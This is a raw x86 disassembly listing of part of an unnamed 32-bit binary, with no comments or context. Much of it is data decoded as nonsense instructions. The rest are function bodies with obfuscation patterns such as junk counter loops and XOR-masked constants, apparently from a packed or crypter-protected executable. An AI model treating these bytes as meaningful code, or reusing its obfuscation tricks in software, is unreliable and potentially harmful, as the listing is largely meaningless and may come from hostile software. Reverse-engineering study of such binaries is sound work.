  407cae:	and    BYTE PTR [edx+ebp*4-0x584ffe3],bl
  407cb5:	call   0x7f18:0xb9562a67
  407cbc:	out    dx,eax
  407cbd:	mov    ah,0x3
  407cbf:	mov    cl,0x7b
  407cc1:	mov    esi,0xbcc7a690
  407cc6:	pop    ds
  407cc7:	mov    DWORD PTR [eax],edx
  407cc9:	push   es
  407cca:	push   ecx
  407ccb:	pop    ecx
  407ccc:	test   al,0xad
  407cce:	ds ss retf 
  407cd1:	jg     0x407d43
  407cd3:	jae    0x407d02
  407cd5:	mov    ecx,0x37610d9b
  407cda:	aas    
  407cdb:	mov    ebx,0x6530e56
  407ce0:	mov    bh,0xca
  407ce2:	xchg   edx,eax
  407ce3:	int    0xb5
  407ce5:	dec    edx
  407ce6:	inc    esp
  407ce7:	sbb    eax,0xc14fa7dd
  407cec:	xchg   esi,eax
  407ced:	sub    BYTE PTR [esi],dl
  407cef:	clc    
  407cf0:	(bad)  
  407cf2:	and    ch,bl
  407cf4:	imul   BYTE PTR [ebx+esi*1]
  407cf7:	(bad)  
  407cf8:	lods   eax,DWORD PTR ds:[esi]
  407cf9:	jmp    0x3c02:0x685c224d
  407d00:	mov    ds:0xa45c91ba,al
  407d05:	dec    ecx
  407d06:	add    BYTE PTR [edx-0x714d94c3],0x3f
  407d0d:	cmp    ebp,DWORD PTR [ebx-0x59]
  407d10:	push   edi
  407d11:	(bad)  
  407d12:	xor    eax,DWORD PTR [edi+0x1b]
  407d15:	xchg   ecx,eax
  407d16:	loope  0x407d3e
  407d18:	std    
  407d19:	(bad)  
  407d1a:	repnz lea ebx,[edi-0x76]
  407d1e:	cmc    
  407d1f:	pop    edi
  407d20:	imul   edi,ecx,0x15
  407d23:	xchg   edi,eax
  407d24:	(bad)  
  407d25:	outs   dx,DWORD PTR ds:[esi]
  407d26:	nop
  407d27:	shl    BYTE PTR [edx+0x7d20554e],1
  407d2d:	add    BYTE PTR [ecx-0xe43e779],bl
  407d33:	sar    DWORD PTR [eax-0x2e],1
  407d36:	and    ah,al
  407d38:	inc    esp
  407d39:	dec    ebp
  407d3a:	or     ebp,DWORD PTR [edx+0x40d8bc22]
  407d40:	retf   0xdf57
  407d43:	adc    ch,BYTE PTR [esi+edi*2+0x1dff6f7f]
  407d4a:	jl     0x407cf7
  407d4c:	fisttp WORD PTR [edi-0x80]
  407d4f:	inc    eax
  407d50:	outs   dx,DWORD PTR ds:[esi]
  407d51:	addr16 pop ebx
  407d53:	in     eax,dx
  407d54:	cmp    al,0x2d
  407d56:	cdq    
  407d57:	sub    ch,ch
  407d59:	mov    eax,0x44452bd
  407d5e:	call   0x5d438c3
  407d63:	je     0x407d0d
  407d65:	or     eax,0xf58c576c
  407d6a:	imul   eax,DWORD PTR [edi+0x75c2af75],0x20
  407d71:	or     dl,ah
  407d73:	cmp    bl,BYTE PTR [edx]
  407d75:	dec    ebp
  407d76:	pop    esi
  407d77:	jne    0x407dda
  407d79:	inc    esp
  407d7a:	jno    0x407d80
  407d7c:	add    al,BYTE PTR [esi]
  407d7e:	sub    edx,DWORD PTR [ecx+0x546079c1]
  407d84:	or     esp,edi
  407d86:	or     eax,0x4693217e
  407d8b:	add    al,0x12
  407d8d:	int    0x32
  407d8f:	out    dx,eax
  407d90:	fdiv   QWORD PTR [edx]
  407d92:	xor    BYTE PTR [ebx],ch
  407d94:	sbb    eax,0x748c3eca
  407d99:	add    eax,0x9485001b
  407d9e:	outs   dx,DWORD PTR ds:[esi]
  407d9f:	xchg   BYTE PTR [ebx-0x2ada0e47],dl
  407da5:	push   es
  407da6:	rcr    ecx,1
  407da8:	rcr    BYTE PTR [eax],1
  407daa:	and    edx,ecx
  407dac:	rol    DWORD PTR [ecx+0x7209702b],0x4f
  407db3:	jne    0x407e1b
  407db5:	in     eax,0x78
  407db7:	sub    al,0x86
  407db9:	gs pop edx
  407dbb:	and    esp,esp
  407dbd:	imul   ebx,DWORD PTR [edx],0x2f4f335
  407dc3:	or     al,BYTE PTR [eax]
  407dc5:	pop    esp
  407dc6:	hlt    
  407dc7:	sbb    ecx,edi
  407dc9:	int    0xf6
  407dcb:	mov    ah,0x66
  407dcd:	xchg   esi,eax
  407dce:	pop    esi
  407dcf:	retf   
  407dd0:	sub    edx,DWORD PTR [eax-0x20]
  407dd3:	dec    edi
  407dd4:	ret    
  407dd5:	js     0x407e0b
  407dd7:	sbb    DWORD PTR [ebx-0x7b],esi
  407dda:	mov    ds:0x229f4752,eax
  407ddf:	mov    esi,0xe2a13246
  407de4:	xor    al,0x60
  407de6:	fdiv   DWORD PTR [ebp-0x65]
  407de9:	jmp    0x27570d29
  407dee:	xchg   ebp,eax
  407def:	pop    eax
  407df0:	sbb    al,0x69
  407df2:	push   edx
  407df3:	pusha  
  407df4:	cmp    DWORD PTR [esi+eax*1],0xffffffa1
  407df8:	sub    al,0xb5
  407dfa:	hlt    
  407dfb:	push   cs
  407dfc:	fucom  st(7)
  407dfe:	in     al,0x8
  407e00:	sti    
  407e01:	in     al,dx
  407e02:	sub    BYTE PTR [edx],bh
  407e04:	and    eax,0x804b6426
  407e09:	xchg   esi,eax
  407e0a:	push   esi
  407e0b:	xchg   ecx,eax
  407e0c:	xlat   BYTE PTR ds:[ebx]
  407e0d:	pop    esi
  407e0e:	(bad)  
  407e0f:	sub    al,0xe4
  407e11:	mov    ecx,0xca1bd59c
  407e16:	jmp    0x6119:0x28271c0c
  407e1d:	add    ecx,DWORD PTR [eax+0x618951c]
  407e23:	popa   
  407e24:	sub    cl,BYTE PTR [edi-0x70]
  407e27:	mov    ds:0x47ee3926,eax
  407e2c:	mov    al,0xfe
  407e2e:	fiadd  DWORD PTR [esi-0x2c]
  407e31:	ja     0x407de0
  407e33:	outs   dx,BYTE PTR ds:[esi]
  407e34:	mov    al,ds:0x8e3694f0
  407e39:	dec    ebp
  407e3a:	jle    0x407e9a
  407e3c:	xchg   esi,eax
  407e3d:	dec    ecx
  407e3e:	push   0x3c8cd0ad
  407e43:	dec    eax
  407e44:	int3   
  407e45:	test   DWORD PTR [ecx],eax
  407e47:	and    eax,0x9e2750d5
  407e4c:	push   ss
  407e4d:	xchg   edx,eax
  407e4e:	in     eax,dx
  407e4f:	cmp    al,BYTE PTR [edx+0x43]
  407e52:	ror    edx,cl
  407e54:	sbb    eax,0xb8c43f8d
  407e59:	arpl   WORD PTR [edi-0x589e27f8],si
  407e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e60:	or     BYTE PTR [ecx-0xbba74f0],0x3d
  407e67:	repnz and DWORD PTR [edi],esi
  407e6a:	or     BYTE PTR [edi],0x84
  407e6d:	pop    ss
  407e6e:	add    BYTE PTR [eax],al
  407e70:	add    BYTE PTR [ebx+0x881e445],cl
  407e76:	sahf   
  407e77:	sbb    al,0x75
  407e79:	pusha  
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0xabb3600d
  408191:	aas    
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	push   ebp
  40819b:	fcomp  QWORD PTR [ebx]
  40819d:	in     eax,0x8f
  40819f:	dec    edx
  4081a0:	mov    ah,0xc8
  4081a2:	ror    bh,1
  4081a4:	ss imul ah
  4081a7:	jae    0x40817f
  4081a9:	fwait
  4081aa:	xchg   DWORD PTR [ebx-0x6f],esp
  4081ad:	jnp    0x408174
  4081af:	pop    ebx
  4081b0:	ror    BYTE PTR ds:0xecbfdc4f,1
  4081b6:	mul    DWORD PTR [edi+esi*8+0x3c534b6d]
  4081bd:	aad    0xe0
  4081bf:	mov    esp,0x10242765
  4081c4:	xchg   esp,eax
  4081c5:	dec    edi
  4081c6:	mov    ecx,DWORD PTR [ebx-0x1]
  4081c9:	jg     0x4081d9
  4081cb:	in     al,0xf4
  4081cd:	pop    ds
  4081ce:	pop    ecx
  4081cf:	popf   
  4081d0:	sbb    eax,0x2e8d508e
  4081d5:	jnp    0x4081a7
  4081d7:	bound  edx,QWORD PTR [edx+edi*4]
  4081da:	inc    ebx
  4081db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081dc:	loopne 0x4081f5
  4081de:	rol    DWORD PTR [edx],1
  4081e0:	(bad)  
  4081e1:	xor    al,0xa8
  4081e3:	xchg   ebx,eax
  4081e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081e5:	or     al,0x43
  4081e7:	test   DWORD PTR [ebx-0xca7e726],eax
  4081ed:	mov    ebp,0x91aeabed
  4081f2:	push   edi
  4081f3:	add    al,0x44
  4081f5:	mov    ecx,0x8154c4ca
  4081fa:	lahf   
  4081fb:	movhps xmm1,QWORD PTR [edx]
  4081fe:	mov    eax,ds:0xd38b6307
  408203:	cmp    al,BYTE PTR [ebp-0x59331232]
  408209:	mov    bh,0xad
  40820b:	shl    DWORD PTR [ecx-0x2c],0x6a
  40820f:	mov    bl,0x4d
  408211:	pushf  
  408212:	push   ebx
  408213:	add    edi,edi
  408215:	pop    ebx
  408216:	pop    es
  408217:	lea    esp,[ebx+0x4a5e9b16]
  40821d:	xchg   ebp,eax
  40821e:	push   es
  40821f:	div    BYTE PTR [esi+0x6923be36]
  408225:	mov    eax,0xcf7ca19c
  40822a:	fcmovnbe st,st(1)
  40822c:	outs   dx,BYTE PTR ds:[esi]
  40822d:	xor    DWORD PTR [eax+0x53],ebp
  408230:	in     al,dx
  408231:	add    esi,DWORD PTR [eax-0x6fce1ce0]
  408237:	iret   
  408238:	ss pop edi
  40823a:	(bad)  
  40823b:	inc    esp
  40823c:	jnp    0x4081df
  40823e:	inc    edx
  40823f:	or     eax,0x8cf8ba3c
  408244:	jle    0x40826b
  408246:	and    bl,al
  408248:	lea    edx,[edi]
  40824a:	jl     0x408247
  40824c:	call   0xbcc7:0xdbec3f27
  408253:	inc    edx
  408254:	fimul  WORD PTR [edi]
  408256:	loop   0x40825d
  408258:	jg     0x4081e1
  40825a:	jecxz  0x4082c3
  40825c:	sbb    bh,BYTE PTR [ebx]
  40825e:	xchg   ebx,eax
  40825f:	and    ch,BYTE PTR [ebx+eiz*2-0x2e93629a]
  408266:	sub    BYTE PTR [ecx-0x2763f5fa],dl
  40826c:	adc    DWORD PTR [edi+0x61],edi
  40826f:	or     dh,BYTE PTR [ecx+eax*1-0x1e]
  408273:	or     al,BYTE PTR ds:0x38f5a9dd
  408279:	sub    ah,ah
  40827b:	loope  0x40825f
  40827d:	dec    edi
  40827e:	mov    dh,0x68
  408280:	std    
  408281:	rcl    bh,0x33
  408284:	pop    esi
  408285:	in     al,dx
  408286:	in     eax,0x4e
  408288:	iret   
  408289:	test   eax,0xf681dbe1
  40828e:	inc    esp
  40828f:	mov    ebp,?
  408291:	sbb    BYTE PTR [ebx+0x7e],ch
  408294:	ja     0x40823c
  408296:	push   es
  408297:	adc    esp,DWORD PTR [ebp-0x602b3007]
  40829d:	inc    eax
  40829e:	push   edx
  40829f:	push   ss
  4082a0:	enter  0xfaae,0xb0
  4082a4:	push   0x5dbb5d06
  4082a9:	out    dx,eax
  4082aa:	scas   eax,DWORD PTR es:[edi]
  4082ab:	and    DWORD PTR [ebp-0x74997f9b],esi
  4082b1:	mov    edx,0x26e0a238
  4082b6:	push   ecx
  4082b7:	imul   esi,DWORD PTR [edx+0x39cd25d],0x2
  4082be:	adc    al,0x42
  4082c1:	in     al,dx
  4082c2:	mov    ebp,0x17de8707
  4082c7:	or     al,0x7a
  4082c9:	lea    edx,[edx+ebp*4+0x37]
  4082cd:	clc    
  4082ce:	xchg   esp,eax
  4082cf:	pop    ebp
  4082d0:	(bad)  
  4082d1:	cdq    
  4082d2:	fwait
  4082d3:	(bad)  
  4082d4:	adc    al,BYTE PTR [ebp+0x4f]
  4082d7:	mov    ds:0x4865cf23,al
  4082dc:	jno    0x408349
  4082de:	push   eax
  4082df:	outs   dx,DWORD PTR ds:[esi]
  4082e0:	adc    bh,ah
  4082e2:	sbb    al,0x3a
  4082e4:	into   
  4082e5:	sbb    al,0x9e
  4082e7:	or     BYTE PTR [ecx+0x66c6a2d6],ah
  4082ed:	ins    DWORD PTR es:[edi],dx
  4082ee:	mov    edx,ebp
  4082f0:	add    bl,al
  4082f2:	imul   ecx,DWORD PTR [edx+0x4db24463],0xffffffcc
  4082f9:	in     al,0xd0
  4082fb:	xchg   ebx,eax
  4082fc:	dec    ebx
  4082fd:	jno    0x40833f
  4082ff:	in     eax,0x2f
  408301:	repz push esp
  408303:	fild   WORD PTR [ebp-0x4d]
  408306:	mov    ds:0xdc1e85be,eax
  40830b:	hlt    
  40830c:	mov    edx,0x8810d486
  408311:	jg     0x408319
  408313:	clc    
  408314:	xchg   ebp,eax
  408315:	outs   dx,BYTE PTR ds:[esi]
  408316:	bound  ebp,QWORD PTR ds:0x61951fe3
  40831c:	jb     0x408308
  40831e:	inc    edi
  40831f:	icebp  
  408320:	enter  0x9614,0xa5
  408324:	pop    ss
  408325:	cmp    edx,ebx
  408327:	ins    BYTE PTR es:[edi],dx
  408328:	call   0x8d2f7b28
  40832d:	cld    
  40832e:	mov    cl,0xaa
  408330:	pop    ss
  408331:	adc    al,cl
  408333:	in     eax,0xe8
  408335:	sub    DWORD PTR [edi+0x4072ca05],esi
  40833b:	adc    DWORD PTR [edi],ebp
  40833d:	call   0x7adf:0xc49715fb
  408344:	xchg   esp,eax
  408345:	pop    es
  408346:	and    eax,0xd4af47ed
  40834b:	jecxz  0x40834c
  40834d:	push   ss
  40834e:	push   ds
  40834f:	adc    ebx,esi
  408351:	jle    0x408357
  408353:	jns    0x4082e2
  408355:	mov    al,ds:0x3d546e21
  40835a:	sub    eax,0x2bb9867a
  40835f:	test   eax,0xa03784c4
  408364:	outs   dx,DWORD PTR ds:[esi]
  408365:	aam    0xae
  408367:	pop    eax
  408368:	fiadd  DWORD PTR [edi]
  40836b:	rol    DWORD PTR [esi+0x582f2446],1
  408371:	jmp    0x14061525
  408376:	popa   
  408377:	inc    ebx
  408378:	mov    bh,0x92
  40837a:	fisubr WORD PTR [eax+0x57]
  40837d:	jp     0x408389
  40837f:	ds xchg esp,eax
  408381:	lds    ebp,FWORD PTR [edi]
  408383:	in     al,dx
  408384:	jb     0x40833a
  408386:	add    DWORD PTR [esi-0x1dac300f],edi
  40838c:	sbb    eax,0x4bc9fe8
  408391:	add    BYTE PTR [ecx+0x3a],dl
  408394:	inc    esi
  408395:	ret    
  408396:	inc    ebp
  408397:	push   ebx
  408398:	mov    edi,ecx
  40839a:	jno    0x4083d1
  40839c:	aaa    
  40839d:	push   ecx
  40839e:	mov    bl,0xd4
  4083a0:	pop    eax
  4083a1:	mov    WORD PTR [ebp+0x72417c90],gs
  4083a7:	pop    ss
  4083a8:	sti    
  4083a9:	mov    edi,es
  4083ab:	cli    
  4083ac:	and    BYTE PTR [ebp+0x318069f1],bl
  4083b2:	mov    dl,0xb4
  4083b4:	mov    edi,0xc065a4a3
  4083b9:	ins    DWORD PTR es:[edi],dx
  4083ba:	pushf  
  4083bb:	ja     0x4083d3
  4083bd:	test   DWORD PTR [ecx],ebx
  4083bf:	retf   0x1067
  4083c2:	fsubp  st(6),st
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43365b,0x0
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	pop    eax
  408465:	ins    BYTE PTR es:[edi],dx
  408466:	scas   eax,DWORD PTR es:[edi]
  408467:	pop    ecx
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	and    DWORD PTR [edx-0x7e],ebx
  408473:	mov    esp,0x228e03a1
  408478:	test   BYTE PTR [ebx],bl
  40847a:	push   ds
  40847b:	in     al,dx
  40847c:	add    DWORD PTR [esi+0x5e],ebp
  40847f:	jno    0x408463
  408481:	mov    ah,al
  408483:	cmp    al,0xd1
  408485:	mov    dl,0xab
  408487:	mov    ah,0x1e
  408489:	les    esp,FWORD PTR [edx]
  40848b:	xchg   edi,eax
  40848c:	push   ds
  40848d:	rcr    BYTE PTR [ecx],0x3b
  408490:	xor    dl,BYTE PTR [ebx]
  408492:	into   
  408493:	jg     0x408472
  408495:	repz mov ebp,DWORD PTR fs:[esp+ebp*1]
  40849a:	pop    ebp
  40849b:	(bad)  
  40849c:	jns    0x408473
  40849e:	cmp    DWORD PTR [ebp-0x1f],edx
  4084a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084a2:	out    dx,al
  4084a3:	out    0x3a,al
  4084a5:	mov    al,0x89
  4084a7:	and    al,0x5b
  4084a9:	js     0x4084ec
  4084ab:	jg     0x4084ee
  4084ad:	repnz adc BYTE PTR [eax+0x36],cl
  4084b1:	jge    0x40851c
  4084b3:	or     ecx,esi
  4084b5:	pop    esi
  4084b6:	stos   DWORD PTR es:[edi],eax
  4084b7:	fs inc ebx
  4084b9:	(bad)  
  4084ba:	cmc    
  4084bb:	lods   al,BYTE PTR ds:[esi]
  4084bc:	add    al,0xca
  4084be:	xchg   ecx,eax
  4084bf:	xchg   ecx,eax
  4084c0:	sub    eax,0xf1bd8926
  4084c5:	pop    eax
  4084c6:	cmp    dl,dl
  4084c8:	sub    al,0x27
  4084ca:	push   ebx
  4084cb:	in     eax,0xd4
  4084cd:	std    
  4084ce:	jmp    0x408487
  4084d0:	iret   
  4084d1:	cwde   
  4084d2:	bound  eax,QWORD PTR [ebx+0x5a93f256]
  4084d8:	xchg   esi,eax
  4084d9:	add    DWORD PTR [edx],0x72
  4084dc:	lods   al,BYTE PTR ds:[esi]
  4084dd:	repz lahf 
  4084df:	in     al,dx
  4084e0:	mov    esp,0x1dc2ef36
  4084e5:	inc    esp
  4084e6:	sbb    BYTE PTR [esi],ah
  4084e8:	jp     0x408549
  4084ea:	jo     0x40851a
  4084ec:	jmp    0x4084b8
  4084ee:	push   0x4bd4d5d5
  4084f3:	push   DWORD PTR [ebx+ecx*8+0x48]
  4084f7:	mov    edi,0x1bfc6b00
  4084fc:	ja     0x408539
  4084fe:	(bad)  
  4084ff:	xchg   edx,eax
  408500:	mov    bh,0x98
  408502:	add    BYTE PTR [esi-0x3a29d0f8],dh
  408508:	xchg   al,cl
  40850a:	push   0x740838bb
  40850f:	ins    BYTE PTR es:[edi],dx
  408510:	fstp   TBYTE PTR [edx]
  408512:	gs mov esi,0x43e1a7b
  408518:	sub    eax,0x4796501
  40851d:	mov    dl,0xbd
  40851f:	mov    esi,0xfa3af423
  408524:	fnstenv [eax]
  408526:	jns    0x408500
  408528:	push   edx
  408529:	dec    esi
  40852a:	popf   
  40852b:	jb     0x40855b
  40852d:	adc    ebx,0x50
  408530:	lahf   
  408531:	mov    eax,ds:0x9b3ea7f2
  408536:	xchg   edx,eax
  408537:	loope  0x408503
  408539:	sub    al,BYTE PTR [edi-0x25c2bd98]
  40853f:	lods   eax,DWORD PTR ds:[esi]
  408540:	xchg   ecx,eax
  408541:	jmp    0x408529
  408543:	jp     0x408564
  408545:	mov    ds,WORD PTR [edx-0x113f21c7]
  40854b:	sub    BYTE PTR [eax],dl
  40854d:	addr16 or eax,0xdc567133
  408553:	mov    ebp,0x186c40e2
  408558:	retf   
  408559:	push   esi
  40855a:	sbb    DWORD PTR [edx],edi
  40855c:	mov    ds:0xcd3f5350,al
  408561:	out    0xce,eax
  408563:	jp     0x408508
  408565:	mov    ecx,gs
  408567:	push   esi
  408568:	and    dh,BYTE PTR [eax-0x3]
  40856b:	and    cl,BYTE PTR [ecx]
  40856d:	adc    BYTE PTR [eax-0x79bf5cd1],bh
  408573:	arpl   bp,ax
  408575:	stc    
  408576:	in     al,dx
  408577:	in     eax,dx
  408578:	in     al,dx
  408579:	pop    ds
  40857a:	push   edx
  40857b:	and    al,0x9b
  40857d:	cmc    
  40857e:	pusha  
  40857f:	xchg   esi,eax
  408580:	icebp  
  408581:	mov    DWORD PTR [eax+ebx*8],edi
  408584:	or     eax,0x63eb0e05
  408589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40858a:	(bad)  
  40858b:	cli    
  40858c:	pop    ds
  40858d:	mov    dl,0x45
  40858f:	fs inc edi
  408591:	add    eax,0x306ca1f9
  408596:	inc    esp
  408597:	mov    ch,BYTE PTR [esi+0x34]
  40859a:	pop    es
  40859b:	repz and ecx,DWORD PTR [esi-0x73]
  40859f:	arpl   WORD PTR [ebx+0x1c45900d],bx
  4085a5:	lock inc esp
  4085a7:	inc    eax
  4085a8:	mov    ds:0x17252beb,eax
